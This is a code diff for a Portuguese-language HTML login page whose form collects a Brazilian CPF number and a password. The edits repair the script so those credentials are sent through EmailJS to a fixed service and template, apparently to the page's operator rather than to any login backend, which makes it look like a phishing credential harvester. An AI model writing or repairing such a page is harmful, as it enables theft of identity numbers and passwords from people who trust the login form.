@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -7,7 +8,7 @@
     <title>Login</title>
 </head>
 <body>
-    <img src="new-logo-white.svg" alt="Logo"> 
+    <img src="new-logo-white.svg" alt="Logo">
 
     <!-- Formulário de login -->
     <form id="login-form">
@@ -47,15 +48,15 @@
 
             // Cria um objeto com os dados do formulário
             var formData = {
-                CPF: CPF,       // Envia o CPF
-                SENHA: SENHA    // Envia a SENHA
+                CPF: cpf,      // Envia o CPF
+                SENHA: senha   // Envia a SENHA
             };
 
             // Exibe no console os dados que serão enviados (para depuração)
             console.log("Enviando dados:", formData);
 
             // Envia os dados para o EmailJS
-            emailjs.send("service_q4yc9r6","template_ug4bg1d")", formData)
+            emailjs.send("service_q4yc9r6", "template_ug4bg1d", formData)
                 .then(function(response) {
                     // Se a resposta for positiva, exibe uma mensagem de sucesso
                     alert("Mensagem enviada com sucesso!");
